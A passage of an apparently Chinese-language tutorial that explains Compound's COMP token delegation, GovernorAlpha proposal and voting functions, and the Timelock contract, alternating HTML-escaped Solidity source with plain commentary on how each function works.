require(n &lt; 2**32, errorMessage);\n        return uint32(n);\n    &#125;\n\n    function safe96(uint n, string memory errorMessage) internal pure returns (uint96) &#123;\n        require(n &lt; 2**96, errorMessage);\n        return uint96(n);\n    &#125;\n\n    function add96(uint96 a, uint96 b, string memory errorMessage) internal pure returns (uint96) &#123;\n        uint96 c = a + b;\n        require(c >= a, errorMessage);\n        return c;\n    &#125;\n\n    function sub96(uint96 a, uint96 b, string memory errorMessage) internal pure returns (uint96) &#123;\n        require(b &lt;= a, errorMessage);\n        return a - b;\n    &#125;\n\n    function getChainId() internal view returns (uint) &#123;\n        uint256 chainId;\n        assembly &#123; chainId := chainid() &#125;\n        return chainId;\n    &#125;\n&#125;\n\n\n\nAnalyzeCOMP，是一个代表vote的ERC-20代币，包含了一些相关的治理方法\n多余的就不做过多解释了，直接进入比较特色的地方\nfunction delegate(address delegatee) public &#123;\n    return _delegate(msg.sender, delegatee);\n&#125;\nfunction delegateBySig(address delegatee, uint nonce, uint expiry, uint8 v, bytes32 r, bytes32 s) public &#123;\n    bytes32 domainSeparator = keccak256(abi.encode(DOMAIN_TYPEHASH, keccak256(bytes(name)), getChainId(), address(this)));\n    bytes32 structHash = keccak256(abi.encode(DELEGATION_TYPEHASH, delegatee, nonce, expiry));\n    bytes32 digest = keccak256(abi.encodePacked(\"\\x19\\x01\", domainSeparator, structHash));\n    address signatory = ecrecover(digest, v, r, s);\n    require(signatory != address(0), \"Comp::delegateBySig: invalid signature\");\n    require(nonce == nonces[signatory]++, \"Comp::delegateBySig: invalid nonce\");\n    require(block.timestamp &lt;= expiry, \"Comp::delegateBySig: signature expired\");\n    return _delegate(signatory, delegatee);\n&#125;\nfunction _delegate(address delegator, address delegatee) internal &#123;\n    address currentDelegate = delegates[delegator];\n    uint96 delegatorBalance = balances[delegator];\n    delegates[delegator] = delegatee;\n\n    emit DelegateChanged(delegator, currentDelegate, delegatee);\n\n    _moveDelegates(currentDelegate, delegatee, delegatorBalance);\n&#125;\n    function _moveDelegates(address srcRep, address dstRep, uint96 amount) internal &#123;\n    if (srcRep != dstRep &amp;&amp; amount > 0) &#123;\n        if (srcRep != address(0)) &#123;\n            uint32 srcRepNum = numCheckpoints[srcRep];\n            uint96 srcRepOld = srcRepNum > 0 ? checkpoints[srcRep][srcRepNum - 1].votes : 0;\n            uint96 srcRepNew = sub96(srcRepOld, amount, \"Comp::_moveVotes: vote amount underflows\");\n            _writeCheckpoint(srcRep, srcRepNum, srcRepOld, srcRepNew);\n        &#125;\n\n        if (dstRep != address(0)) &#123;\n            uint32 dstRepNum = numCheckpoints[dstRep];\n            uint96 dstRepOld = dstRepNum > 0 ? checkpoints[dstRep][dstRepNum - 1].votes : 0;\n            uint96 dstRepNew = add96(dstRepOld, amount, \"Comp::_moveVotes: vote amount overflows\");\n            _writeCheckpoint(dstRep, dstRepNum, dstRepOld, dstRepNew);\n        &#125;\n    &#125;\n&#125;\n    function _writeCheckpoint(address delegatee, uint32 nCheckpoints, uint96 oldVotes, uint96 newVotes) internal &#123;\n  uint32 blockNumber = safe32(block.number, \"Comp::_writeCheckpoint: block number exceeds 32 bits\");\n\n  if (nCheckpoints > 0 &amp;&amp; checkpoints[delegatee][nCheckpoints - 1].fromBlock == blockNumber) &#123;\n      checkpoints[delegatee][nCheckpoints - 1].votes = newVotes;\n  &#125; else &#123;\n      checkpoints[delegatee][nCheckpoints] = Checkpoint(blockNumber, newVotes);\n      numCheckpoints[delegatee] = nCheckpoints + 1;\n  &#125;\n\n  emit DelegateVotesChanged(delegatee, oldVotes, newVotes);\n&#125;\n\n转账是时会调用到 moveDelegates函数，同时调用writeCheckpoint函数更新票数。该部分函数实现了将投票权进行委托。被委托人的投票权就是自己的COPMP+被委托给的COMP\n判断是否在同一block，在则直接加，不在则将长度加一，对应最新的block存储新的数据\nfunction getPriorVotes(address account, uint blockNumber) public view returns (uint96) &#123;\n    require(blockNumber &lt; block.number, \"Comp::getPriorVotes: not yet determined\");\n\n    uint32 nCheckpoints = numCheckpoints[account];\n    if (nCheckpoints == 0) &#123;\n        return 0;\n    &#125;\n\n    // First check most recent balance\n    if (checkpoints[account][nCheckpoints - 1].fromBlock &lt;= blockNumber) &#123;\n        return checkpoints[account][nCheckpoints - 1].votes;\n    &#125;\n\n    // Next check implicit zero balance\n    if (checkpoints[account][0].fromBlock > blockNumber) &#123;\n        return 0;\n    &#125;\n\n    uint32 lower = 0;\n    uint32 upper = nCheckpoints - 1;\n    while (upper > lower) &#123;\n        uint32 center = upper - (upper - lower) / 2; // ceil, avoiding overflow\n        Checkpoint memory cp = checkpoints[account][center];\n        if (cp.fromBlock == blockNumber) &#123;\n            return cp.votes;\n        &#125; else if (cp.fromBlock &lt; blockNumber) &#123;\n            lower = center;\n        &#125; else &#123;\n            upper = center - 1;\n        &#125;\n    &#125;\n    return checkpoints[account][lower].votes;\n&#125;\n\n为了获得某个区块号下的投票权，我们可以调用getPriorVotes来检索该值。调用时会判断fromblock所搜索的blocknumber进行比较，所以只对于过去的block适用\nGovernance AlphaCode\nClick to see more\n// SPDX-License-Identifier: BSD-3-Clause\npragma solidity ^0.8.10;\n\ncontract GovernorAlpha &#123;\n    /// @notice The name of this contract\n    string public constant name = \"Compound Governor Alpha\";\n\n    /// @notice The number of votes in support of a proposal required in order for a quorum to be reached and for a vote to succeed\n    function quorumVotes() public pure returns (uint) &#123; return 400000e18; &#125; // 400,000 = 4% of Comp\n\n    /// @notice The number of votes required in order for a voter to become a proposer\n    function proposalThreshold() public pure returns (uint) &#123; return 100000e18; &#125; // 100,000 = 1% of Comp\n\n    /// @notice The maximum number of actions that can be included in a proposal\n    function proposalMaxOperations() public pure returns (uint) &#123; return 10; &#125; // 10 actions\n\n    /// @notice The delay before voting on a proposal may take place, once proposed\n    function votingDelay() public pure returns (uint) &#123; return 1; &#125; // 1 block\n\n    /// @notice The duration of voting on a proposal, in blocks\n    function votingPeriod() virtual public pure returns (uint) &#123; return 17280; &#125; // ~3 days in blocks (assuming 15s blocks)\n\n    /// @notice The address of the Compound Protocol Timelock\n    TimelockInterface public timelock;\n\n    /// @notice The address of the Compound governance token\n    CompInterface public comp;\n\n    /// @notice The address of the Governor Guardian\n    address public guardian;\n\n    /// @notice The total number of proposals\n    uint public proposalCount;\n\n    struct Proposal &#123;\n        /// @notice Unique id for looking up a proposal\n        uint id;\n\n        /// @notice Creator of the proposal\n        address proposer;\n\n        /// @notice The timestamp that the proposal will be available for execution, set once the vote succeeds\n        uint eta;\n\n        /// @notice the ordered list of target addresses for calls to be made\n        address[] targets;\n\n        /// @notice The ordered list of values (i.e. msg.value) to be passed to the calls to be made\n        uint[] values;\n\n        /// @notice The ordered list of function signatures to be called\n        string[] signatures;\n\n        /// @notice The ordered list of calldata to be passed to each call\n        bytes[] calldatas;\n\n        /// @notice The block at which voting begins: holders must delegate their votes prior to this block\n        uint startBlock;\n\n        /// @notice The block at which voting ends: votes must be cast prior to this block\n        uint endBlock;\n\n        /// @notice Current number of votes in favor of this proposal\n        uint forVotes;\n\n        /// @notice Current number of votes in opposition to this proposal\n        uint againstVotes;\n\n        /// @notice Flag marking whether the proposal has been canceled\n        bool canceled;\n\n        /// @notice Flag marking whether the proposal has been executed\n        bool executed;\n\n        /// @notice Receipts of ballots for the entire set of voters\n        mapping (address => Receipt) receipts;\n    &#125;\n\n    /// @notice Ballot receipt record for a voter\n    struct Receipt &#123;\n        /// @notice Whether or not a vote has been cast\n        bool hasVoted;\n\n        /// @notice Whether or not the voter supports the proposal\n        bool support;\n\n        /// @notice The number of votes the voter had, which were cast\n        uint96 votes;\n    &#125;\n\n    /// @notice Possible states that a proposal may be in\n    enum ProposalState &#123;\n        Pending,\n        Active,\n        Canceled,\n        Defeated,\n        Succeeded,\n        Queued,\n        Expired,\n        Executed\n    &#125;\n\n    /// @notice The official record of all proposals ever proposed\n    mapping (uint => Proposal) public proposals;\n\n    /// @notice The latest proposal for each proposer\n    mapping (address => uint) public latestProposalIds;\n\n    /// @notice The EIP-712 typehash for the contract's domain\n    bytes32 public constant DOMAIN_TYPEHASH = keccak256(\"EIP712Domain(string name,uint256 chainId,address verifyingContract)\");\n\n    /// @notice The EIP-712 typehash for the ballot struct used by the contract\n    bytes32 public constant BALLOT_TYPEHASH = keccak256(\"Ballot(uint256 proposalId,bool support)\");\n\n    /// @notice An event emitted when a new proposal is created\n    event ProposalCreated(uint id, address proposer, address[] targets, uint[] values, string[] signatures, bytes[] calldatas, uint startBlock, uint endBlock, string description);\n\n    /// @notice An event emitted when a vote has been cast on a proposal\n    event VoteCast(address voter, uint proposalId, bool support, uint votes);\n\n    /// @notice An event emitted when a proposal has been canceled\n    event ProposalCanceled(uint id);\n\n    /// @notice An event emitted when a proposal has been queued in the Timelock\n    event ProposalQueued(uint id, uint eta);\n\n    /// @notice An event emitted when a proposal has been executed in the Timelock\n    event ProposalExecuted(uint id);\n\n    constructor(address timelock_, address comp_, address guardian_) public &#123;\n        timelock = TimelockInterface(timelock_);\n        comp = CompInterface(comp_);\n        guardian = guardian_;\n    &#125;\n\n    function propose(address[] memory targets, uint[] memory values, string[] memory signatures, bytes[] memory calldatas, string memory description) public returns (uint) &#123;\n        require(comp.getPriorVotes(msg.sender, sub256(block.number, 1)) > proposalThreshold(), \"GovernorAlpha::propose: proposer votes below proposal threshold\");\n        require(targets.length == values.length &amp;&amp; targets.length == signatures.length &amp;&amp; targets.length == calldatas.length, \"GovernorAlpha::propose: proposal function information arity mismatch\");\n        require(targets.length != 0, \"GovernorAlpha::propose: must provide actions\");\n        require(targets.length &lt;= proposalMaxOperations(), \"GovernorAlpha::propose: too many actions\");\n\n        uint latestProposalId = latestProposalIds[msg.sender];\n        if (latestProposalId != 0) &#123;\n          ProposalState proposersLatestProposalState = state(latestProposalId);\n          require(proposersLatestProposalState != ProposalState.Active, \"GovernorAlpha::propose: one live proposal per proposer, found an already active proposal\");\n          require(proposersLatestProposalState != ProposalState.Pending, \"GovernorAlpha::propose: one live proposal per proposer, found an already pending proposal\");\n        &#125;\n\n        uint startBlock = add256(block.number, votingDelay());\n        uint endBlock = add256(startBlock, votingPeriod());\n\n        proposalCount++;\n        uint proposalId = proposalCount;\n        Proposal storage newProposal = proposals[proposalId];\n        // This should never happen but add a check in case.\n        require(newProposal.id == 0, \"GovernorAlpha::propose: ProposalID collsion\");\n        newProposal.id = proposalId;\n        newProposal.proposer = msg.sender;\n        newProposal.eta = 0;\n        newProposal.targets = targets;\n        newProposal.values = values;\n        newProposal.signatures = signatures;\n        newProposal.calldatas = calldatas;\n        newProposal.startBlock = startBlock;\n        newProposal.endBlock = endBlock;\n        newProposal.forVotes = 0;\n        newProposal.againstVotes = 0;\n        newProposal.canceled = false;\n        newProposal.executed = false;\n\n        latestProposalIds[newProposal.proposer] = newProposal.id;\n\n        emit ProposalCreated(newProposal.id, msg.sender, targets, values, signatures, calldatas, startBlock, endBlock, description);\n        return newProposal.id;\n    &#125;\n\n    function queue(uint proposalId) public &#123;\n        require(state(proposalId) == ProposalState.Succeeded, \"GovernorAlpha::queue: proposal can only be queued if it is succeeded\");\n        Proposal storage proposal = proposals[proposalId];\n        uint eta = add256(block.timestamp, timelock.delay());\n        for (uint i = 0; i &lt; proposal.targets.length; i++) &#123;\n            _queueOrRevert(proposal.targets[i], proposal.values[i], proposal.signatures[i], proposal.calldatas[i], eta);\n        &#125;\n        proposal.eta = eta;\n        emit ProposalQueued(proposalId, eta);\n    &#125;\n\n    function _queueOrRevert(address target, uint value, string memory signature, bytes memory data, uint eta) internal &#123;\n        require(!timelock.queuedTransactions(keccak256(abi.encode(target, value, signature, data, eta))), \"GovernorAlpha::_queueOrRevert: proposal action already queued at eta\");\n        timelock.queueTransaction(target, value, signature, data, eta);\n    &#125;\n\n    function execute(uint proposalId) public payable &#123;\n        require(state(proposalId) == ProposalState.Queued, \"GovernorAlpha::execute: proposal can only be executed if it is queued\");\n        Proposal storage proposal = proposals[proposalId];\n        proposal.executed = true;\n        for (uint i = 0; i &lt; proposal.targets.length; i++) &#123;\n            timelock.executeTransaction&#123;value: proposal.values[i]&#125;(proposal.targets[i], proposal.values[i], proposal.signatures[i], proposal.calldatas[i], proposal.eta);\n        &#125;\n        emit ProposalExecuted(proposalId);\n    &#125;\n\n    function cancel(uint proposalId) public &#123;\n        ProposalState state = state(proposalId);\n        require(state != ProposalState.Executed, \"GovernorAlpha::cancel: cannot cancel executed proposal\");\n\n        Proposal storage proposal = proposals[proposalId];\n        require(msg.sender == guardian || comp.getPriorVotes(proposal.proposer, sub256(block.number, 1)) &lt; proposalThreshold(), \"GovernorAlpha::cancel: proposer above threshold\");\n\n        proposal.canceled = true;\n        for (uint i = 0; i &lt; proposal.targets.length; i++) &#123;\n            timelock.cancelTransaction(proposal.targets[i], proposal.values[i], proposal.signatures[i], proposal.calldatas[i], proposal.eta);\n        &#125;\n\n        emit ProposalCanceled(proposalId);\n    &#125;\n\n    function getActions(uint proposalId) public view returns (address[] memory targets, uint[] memory values, string[] memory signatures, bytes[] memory calldatas) &#123;\n        Proposal storage p = proposals[proposalId];\n        return (p.targets, p.values, p.signatures, p.calldatas);\n    &#125;\n\n    function getReceipt(uint proposalId, address voter) public view returns (Receipt memory) &#123;\n        return proposals[proposalId].receipts[voter];\n    &#125;\n\n    function state(uint proposalId) public view returns (ProposalState) &#123;\n        require(proposalCount >= proposalId &amp;&amp; proposalId > 0, \"GovernorAlpha::state: invalid proposal id\");\n        Proposal storage proposal = proposals[proposalId];\n        if (proposal.canceled) &#123;\n            return ProposalState.Canceled;\n        &#125; else if (block.number &lt;= proposal.startBlock) &#123;\n            return ProposalState.Pending;\n        &#125; else if (block.number &lt;= proposal.endBlock) &#123;\n            return ProposalState.Active;\n        &#125; else if (proposal.forVotes &lt;= proposal.againstVotes || proposal.forVotes &lt; quorumVotes()) &#123;\n            return ProposalState.Defeated;\n        &#125; else if (proposal.eta == 0) &#123;\n            return ProposalState.Succeeded;\n        &#125; else if (proposal.executed) &#123;\n            return ProposalState.Executed;\n        &#125; else if (block.timestamp >= add256(proposal.eta, timelock.GRACE_PERIOD())) &#123;\n            return ProposalState.Expired;\n        &#125; else &#123;\n            return ProposalState.Queued;\n        &#125;\n    &#125;\n\n    function castVote(uint proposalId, bool support) public &#123;\n        return _castVote(msg.sender, proposalId, support);\n    &#125;\n\n    function castVoteBySig(uint proposalId, bool support, uint8 v, bytes32 r, bytes32 s) public &#123;\n        bytes32 domainSeparator = keccak256(abi.encode(DOMAIN_TYPEHASH, keccak256(bytes(name)), getChainId(), address(this)));\n        bytes32 structHash = keccak256(abi.encode(BALLOT_TYPEHASH, proposalId, support));\n        bytes32 digest = keccak256(abi.encodePacked(\"\\x19\\x01\", domainSeparator, structHash));\n        address signatory = ecrecover(digest, v, r, s);\n        require(signatory != address(0), \"GovernorAlpha::castVoteBySig: invalid signature\");\n        return _castVote(signatory, proposalId, support);\n    &#125;\n\n    function _castVote(address voter, uint proposalId, bool support) internal &#123;\n        require(state(proposalId) == ProposalState.Active, \"GovernorAlpha::_castVote: voting is closed\");\n        Proposal storage proposal = proposals[proposalId];\n        Receipt storage receipt = proposal.receipts[voter];\n        require(receipt.hasVoted == false, \"GovernorAlpha::_castVote: voter already voted\");\n        uint96 votes = comp.getPriorVotes(voter, proposal.startBlock);\n\n        if (support) &#123;\n            proposal.forVotes = add256(proposal.forVotes, votes);\n        &#125; else &#123;\n            proposal.againstVotes = add256(proposal.againstVotes, votes);\n        &#125;\n\n        receipt.hasVoted = true;\n        receipt.support = support;\n        receipt.votes = votes;\n\n        emit VoteCast(voter, proposalId, support, votes);\n    &#125;\n\n    function __acceptAdmin() public &#123;\n        require(msg.sender == guardian, \"GovernorAlpha::__acceptAdmin: sender must be gov guardian\");\n        timelock.acceptAdmin();\n    &#125;\n\n    function __abdicate() public &#123;\n        require(msg.sender == guardian, \"GovernorAlpha::__abdicate: sender must be gov guardian\");\n        guardian = address(0);\n    &#125;\n\n    function __queueSetTimelockPendingAdmin(address newPendingAdmin, uint eta) public &#123;\n        require(msg.sender == guardian, \"GovernorAlpha::__queueSetTimelockPendingAdmin: sender must be gov guardian\");\n        timelock.queueTransaction(address(timelock), 0, \"setPendingAdmin(address)\", abi.encode(newPendingAdmin), eta);\n    &#125;\n\n    function __executeSetTimelockPendingAdmin(address newPendingAdmin, uint eta) public &#123;\n        require(msg.sender == guardian, \"GovernorAlpha::__executeSetTimelockPendingAdmin: sender must be gov guardian\");\n        timelock.executeTransaction(address(timelock), 0, \"setPendingAdmin(address)\", abi.encode(newPendingAdmin), eta);\n    &#125;\n\n    function add256(uint256 a, uint256 b) internal pure returns (uint) &#123;\n        uint c = a + b;\n        require(c >= a, \"addition overflow\");\n        return c;\n    &#125;\n\n    function sub256(uint256 a, uint256 b) internal pure returns (uint) &#123;\n        require(b &lt;= a, \"subtraction underflow\");\n        return a - b;\n    &#125;\n\n    function getChainId() internal view returns (uint) &#123;\n        uint chainId;\n        assembly &#123; chainId := chainid() &#125;\n        return chainId;\n    &#125;\n&#125;\n\ninterface TimelockInterface &#123;\n    function delay() external view returns (uint);\n    function GRACE_PERIOD() external view returns (uint);\n    function acceptAdmin() external;\n    function queuedTransactions(bytes32 hash) external view returns (bool);\n    function queueTransaction(address target, uint value, string calldata signature, bytes calldata data, uint eta) external returns (bytes32);\n    function cancelTransaction(address target, uint value, string calldata signature, bytes calldata data, uint eta) external;\n    function executeTransaction(address target, uint value, string calldata signature, bytes calldata data, uint eta) external payable returns (bytes memory);\n&#125;\n\ninterface CompInterface &#123;\n    function getPriorVotes(address account, uint blockNumber) external view returns (uint96);\n&#125;\n\n\n\nAnalyzefunction propose(address[] memory targets, uint[] memory values, string[] memory signatures, bytes[] memory calldatas, string memory description) public returns (uint) &#123;\n    require(comp.getPriorVotes(msg.sender, sub256(block.number, 1)) > proposalThreshold(), \"GovernorAlpha::propose: proposer votes below proposal threshold\");\n    require(targets.length == values.length &amp;&amp; targets.length == signatures.length &amp;&amp; targets.length == calldatas.length, \"GovernorAlpha::propose: proposal function information arity mismatch\");\n    require(targets.length != 0, \"GovernorAlpha::propose: must provide actions\");\n    require(targets.length &lt;= proposalMaxOperations(), \"GovernorAlpha::propose: too many actions\");\n\n    uint latestProposalId = latestProposalIds[msg.sender];\n    if (latestProposalId != 0) &#123;\n      ProposalState proposersLatestProposalState = state(latestProposalId);\n      require(proposersLatestProposalState != ProposalState.Active, \"GovernorAlpha::propose: one live proposal per proposer, found an already active proposal\");\n      require(proposersLatestProposalState != ProposalState.Pending, \"GovernorAlpha::propose: one live proposal per proposer, found an already pending proposal\");\n    &#125;\n\n    uint startBlock = add256(block.number, votingDelay());\n    uint endBlock = add256(startBlock, votingPeriod());\n\n    proposalCount++;\n    uint proposalId = proposalCount;\n    Proposal storage newProposal = proposals[proposalId];\n    // This should never happen but add a check in case.\n    require(newProposal.id == 0, \"GovernorAlpha::propose: ProposalID collsion\");\n    newProposal.id = proposalId;\n    newProposal.proposer = msg.sender;\n    newProposal.eta = 0;\n    newProposal.targets = targets;\n    newProposal.values = values;\n    newProposal.signatures = signatures;\n    newProposal.calldatas = calldatas;\n    newProposal.startBlock = startBlock;\n    newProposal.endBlock = endBlock;\n    newProposal.forVotes = 0;\n    newProposal.againstVotes = 0;\n    newProposal.canceled = false;\n    newProposal.executed = false;\n\n    latestProposalIds[newProposal.proposer] = newProposal.id;\n\n    emit ProposalCreated(newProposal.id, msg.sender, targets, values, signatures, calldatas, startBlock, endBlock, description);\n    return newProposal.id;\n&#125;\n\n创建提案有所限制，需要提案人再上一个块的票数大于提案门槛。紧接着判断target，value，signature以及calldata长度对应相等，检测对应的action不为0也不大与最大值10\n如果创建该提案者不止有这一个提案，则判断上一个提案是否处于active或pending状态下，必须满足只有一个提案处于active或pending的状态\n创建时需要提供执行时需要的target，value，函数的signuture以及calldata（或纯calldata）\n计算开始和结束的block，最后更新提案到Proposal映射中去，同时更新最新的提案id为当前的提案id\nfunction cancel(uint proposalId) public &#123;\n    ProposalState state = state(proposalId);\n    require(state != ProposalState.Executed, \"GovernorAlpha::cancel: cannot cancel executed proposal\");\n\n    Proposal storage proposal = proposals[proposalId];\n    require(msg.sender == guardian || comp.getPriorVotes(proposal.proposer, sub256(block.number, 1)) &lt; proposalThreshold(), \"GovernorAlpha::cancel: proposer above threshold\");\n\n    proposal.canceled = true;\n    for (uint i = 0; i &lt; proposal.targets.length; i++) &#123;\n        timelock.cancelTransaction(proposal.targets[i], proposal.values[i], proposal.signatures[i], proposal.calldatas[i], proposal.eta);\n    &#125;\n\n    emit ProposalCanceled(proposalId);\n&#125;\n\n结束一个提案，首先判断是否已执行，不能结束一个已执行的提案，只有满足guardian执行操作或者满足proposer再上一个块的票数低于提案门槛的情况下才可以结束一个提案\n将对应提案的canceled变量设置为true，同时取消对需要执行的操作标记，将timelock.queuedTransactions(keccak256(abi.encode(target, value, signature, data, eta))重新更改为false\nfunction castVote(uint proposalId, bool support) public &#123;\n    return _castVote(msg.sender, proposalId, support);\n&#125;\n\nfunction castVoteBySig(uint proposalId, bool support, uint8 v, bytes32 r, bytes32 s) public &#123;\n    bytes32 domainSeparator = keccak256(abi.encode(DOMAIN_TYPEHASH, keccak256(bytes(name)), getChainId(), address(this)));\n    bytes32 structHash = keccak256(abi.encode(BALLOT_TYPEHASH, proposalId, support));\n    bytes32 digest = keccak256(abi.encodePacked(\"\\x19\\x01\", domainSeparator, structHash));\n    address signatory = ecrecover(digest, v, r, s);\n    require(signatory != address(0), \"GovernorAlpha::castVoteBySig: invalid signature\");\n    return _castVote(signatory, proposalId, support);\n&#125;\n\nfunction _castVote(address voter, uint proposalId, bool support) internal &#123;\n    require(state(proposalId) == ProposalState.Active, \"GovernorAlpha::_castVote: voting is closed\");\n    Proposal storage proposal = proposals[proposalId];\n    Receipt storage receipt = proposal.receipts[voter];\n    require(receipt.hasVoted == false, \"GovernorAlpha::_castVote: voter already voted\");\n    uint96 votes = comp.getPriorVotes(voter, proposal.startBlock);\n\n    if (support) &#123;\n        proposal.forVotes = add256(proposal.forVotes, votes);\n    &#125; else &#123;\n        proposal.againstVotes = add256(proposal.againstVotes, votes);\n    &#125;\n\n    receipt.hasVoted = true;\n    receipt.support = support;\n    receipt.votes = votes;\n\n    emit VoteCast(voter, proposalId, support, votes);\n&#125;\n\n三个投票函数，核心函数为_castVote，三个参数分别为投票者，投票的提案编号以及支持与否\n首先判断所投提案是否是active，必须在active情况下可以进行投票，再判断当前投票者是否已经对此提案进行过投票，要求没有进行过投票\n投票是任何人均可投票，前提是有票（这里对应到compound token合约）票数是取决于上一个区块时对应的vote而不是当前区块，对应支持与否将所对应的票数进行加减，同时记录投票者的投票数据\ncastVoteBySig使用了签名的方法，其余相同\nfunction queue(uint proposalId) public &#123;\n    require(state(proposalId) == ProposalState.Succeeded, \"GovernorAlpha::queue: proposal can only be queued if it is succeeded\");\n    Proposal storage proposal = proposals[proposalId];\n    uint eta = add256(block.timestamp, timelock.delay());\n    for (uint i = 0; i &lt; proposal.targets.length; i++) &#123;\n        _queueOrRevert(proposal.targets[i], proposal.values[i], proposal.signatures[i], proposal.calldatas[i], eta);\n    &#125;\n    proposal.eta = eta;\n    emit ProposalQueued(proposalId, eta);\n&#125;\n\n此函数将提案加入排队，先判断提案是否成功，成功的投票才可以加入队列，支持票大于反对票并且支持票大于4%comp发行量\n再通过调用_queueOrRevert函数判断已经进入队列的提案是否含有相同操作的交易，如果不存在则将对应交易进行标记记录，避免队列中含有相同的交易\n同时更新eta，即提案开始执行的时间\nfunction execute(uint proposalId) public payable &#123;\n    require(state(proposalId) == ProposalState.Queued, \"GovernorAlpha::execute: proposal can only be executed if it is queued\");\n    Proposal storage proposal = proposals[proposalId];\n    proposal.executed = true;\n    for (uint i = 0; i &lt; proposal.targets.length; i++) &#123;\n        timelock.executeTransaction&#123;value: proposal.values[i]&#125;(proposal.targets[i], proposal.values[i], proposal.signatures[i], proposal.calldatas[i], proposal.eta);\n    &#125;\n    emit ProposalExecuted(proposalId);\n&#125;\n\n该函数用于执行（投票后不立刻执行，而是需要有人进行操作），提案有一定公示期，在此期间可以取消（Timelock. Delay()），先判断提案是否已经处于队列中，满足要求则更新对应变量，调用timelock合约下的executeTransaction函数依次执行操作\n剩下一些get函数，运算函数以及变量修改函数比较简单，这里就不再做过多解释了\nTimelockCode\nClick to see more\n// SPDX-License-Identifier: BSD-3-Clause\npragma solidity ^0.8.10;\n\nimport \"./SafeMath.sol\";\n\ncontract Timelock &#123;\n    using SafeMath for uint;\n\n    event NewAdmin(address indexed newAdmin);\n    event NewPendingAdmin(address indexed newPendingAdmin);\n    event NewDelay(uint indexed newDelay);\n    event CancelTransaction(bytes32 indexed txHash, address indexed target, uint value, string signature,  bytes data, uint eta);\n    event ExecuteTransaction(bytes32 indexed txHash, address indexed target, uint value, string signature,  bytes data, uint eta);\n    event QueueTransaction(bytes32 indexed txHash, address indexed target, uint value, string signature, bytes data, uint eta);\n\n    uint public constant GRACE_PERIOD = 14 days;\n    uint public constant MINIMUM_DELAY = 2 days;\n    uint public constant MAXIMUM_DELAY = 30 days;\n\n    address public admin;\n    address public pendingAdmin;\n    uint public delay;\n\n    mapping (bytes32 => bool) public queuedTransactions;\n\n\n    constructor(address admin_, uint delay_) public &#123;\n        require(delay_ >= MINIMUM_DELAY, \"Timelock::constructor: Delay must exceed minimum delay.\");\n        require(delay_ &lt;= MAXIMUM_DELAY, \"Timelock::setDelay: Delay must not exceed maximum delay.\");\n\n        admin = admin_;\n        delay = delay_;\n    &#125;\n\n    fallback() external payable &#123; &#125;\n\n    function setDelay(uint delay_) public &#123;\n        require(msg.sender == address(this), \"Timelock::setDelay: Call must come from Timelock.\");\n        require(delay_ >= MINIMUM_DELAY, \"Timelock::setDelay: Delay must exceed minimum delay.\");\n        require(delay_ &lt;= MAXIMUM_DELAY, \"Timelock::setDelay: Delay must not exceed maximum delay.\");\n        delay = delay_;\n\n        emit NewDelay(delay);\n    &#125;\n\n    function acceptAdmin() public &#123;\n        require(msg.sender == pendingAdmin, \"Timelock::acceptAdmin: Call must come from pendingAdmin.\");\n        admin = msg.sender;\n        pendingAdmin = address(0);\n\n        emit NewAdmin(admin);\n    &#125;\n\n    function setPendingAdmin(address pendingAdmin_) public &#123;\n        require(msg.sender == address(this), \"Timelock::setPendingAdmin: Call must come from Timelock.\");\n        pendingAdmin = pendingAdmin_;\n\n        emit NewPendingAdmin(pendingAdmin);\n    &#125;\n\n    function queueTransaction(address target, uint value, string memory signature, bytes memory data, uint eta) public returns (bytes32) &#123;\n        require(msg.sender == admin, \"Timelock::queueTransaction: Call must come from admin.\");\n        require(eta >= getBlockTimestamp().add(delay), \"Timelock::queueTransaction: Estimated execution block must satisfy delay.\");\n\n        bytes32 txHash = keccak256(abi.encode(target, value, signature, data, eta));\n        queuedTransactions[txHash] = true;\n\n        emit QueueTransaction(txHash, target, value, signature, data, eta);\n        return txHash;\n    &#125;\n\n    function cancelTransaction(address target, uint value, string memory signature, bytes memory data, uint eta) public &#123;\n        require(msg.sender == admin, \"Timelock::cancelTransaction: Call must come from admin.\");\n\n        bytes32 txHash = keccak256(abi.encode(target, value, signature, data, eta));\n        queuedTransactions[txHash] = false;\n\n        emit CancelTransaction(txHash, target, value, signature, data, eta);\n    &#125;\n\n    function executeTransaction(address target, uint value, string memory signature, bytes memory data, uint eta) public payable returns (bytes memory) &#123;\n        require(msg.sender == admin, \"Timelock::executeTransaction: Call must come from admin.\");\n\n        bytes32 txHash = keccak256(abi.encode(target, value, signature, data, eta));\n        require(queuedTransactions[txHash], \"Timelock::executeTransaction: Transaction hasn't been queued.\");\n        require(getBlockTimestamp() >= eta, \"Timelock::executeTransaction: Transaction hasn't surpassed time lock.\");\n        require(getBlockTimestamp() &lt;= eta.add(GRACE_PERIOD), \"Timelock::executeTransaction: Transaction is stale.\");\n\n        queuedTransactions[txHash] = false;\n\n        bytes memory callData;\n\n        if (bytes(signature).length == 0) &#123;\n            callData = data;\n        &#125; else &#123;\n            callData = abi.encodePacked(bytes4(keccak256(bytes(signature))), data);\n        &#125;\n\n        // solium-disable-next-line security/no-call-value\n        (bool success, bytes memory returnData) = target.call&#123;value: value&#125;(callData);\n        require(success, \"Timelock::executeTransaction: Transaction execution reverted.\");\n\n        emit ExecuteTransaction(txHash, target, value, signature, data, eta);\n\n        return returnData;\n    &#125;\n\n    function getBlockTimestamp() internal view returns (uint) &#123;\n        // solium-disable-next-line security/no-block-members\n        return block.timestamp;\n    &#125;\n&#125;\n\n\n\nAnalyze配合Governance Alpha合约，进行排队操作，取消操作，执行操作等功能\n其中delay为执行时间的限制\n代码如下，比较简单，不再过多解释\nfunction queueTransaction(address target, uint value, string memory signature, bytes memory data, uint eta) public returns (bytes32) &#123;\n    require(msg.sender == admin, \"Timelock::queueTransaction: Call must come from admin.\");\n    require(eta >= getBlockTimestamp().add(delay), \"Timelock::queueTransaction: Estimated execution block must satisfy delay.\");\n\n    bytes32 txHash = keccak256(abi.encode(target, value, signature, data, eta));\n    queuedTransactions[txHash] = true;\n\n    emit QueueTransaction(txHash, target, value, signature, data, eta);\n    return txHash;\n&#125;\n\nfunction cancelTransaction(address target, uint value, string memory signature, bytes memory data, uint eta) public &#123;\n    require(msg.sender == admin, \"Timelock::cancelTransaction: Call must come from admin.\");\n\n    bytes32 txHash = keccak256(abi.encode(target, value, signature, data, eta));\n    queuedTransactions[txHash] = false;\n\n    emit CancelTransaction(txHash, target, value, signature, data, eta);\n&#125;\n\nfunction executeTransaction(address target, uint value, string memory signature, bytes memory data, uint eta) public payable returns (bytes memory) &#123;\n    require(msg.sender == admin, \"Timelock::executeTransaction: Call must come from 